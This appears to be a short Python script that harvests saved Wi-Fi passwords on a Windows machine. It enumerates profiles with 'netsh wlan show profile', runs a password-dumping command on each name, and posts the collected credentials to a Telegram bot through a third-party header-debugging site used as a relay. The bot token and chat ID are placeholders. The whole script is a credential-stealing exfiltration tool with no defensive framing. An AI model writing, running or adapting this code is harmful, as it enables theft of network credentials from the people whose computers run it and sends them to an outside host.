import wifiPassword
import subprocess
import requests

command1 = subprocess.getoutput("netsh wlan show profile")
command2 = (
    command1.replace("Profiles on interface Wi-Fi:", "")
    .replace("Group policy profiles (read only)", "")
    .replace("---------------------------------", "")
    .replace("<None>", "")
    .replace("User profiles", "")
    .replace("-------------", "")
    .replace("All User Profile", "")
    .replace(":", "")
)
listed = command2.split(
    """
"""
)
text = ""
for i in listed:
    command3 = subprocess.getoutput("wifipassword " + i)
    text = text + command3
print(text)
url = (
    "https://api.telegram.org/botTOKEN/sendmessage?chat_id=ABCDEFGHI&text="
    + text
)
pocket = {
    "UrlBox": url,
    "AgentList": "Google Chrome",
    "VersionsList": "HTTP/1.1",
    "MethodList": "POST",
}
req = requests.post("http://httpdebugger.com/Tools/ViewHttpHeaders.aspx", pocket)
print(req)
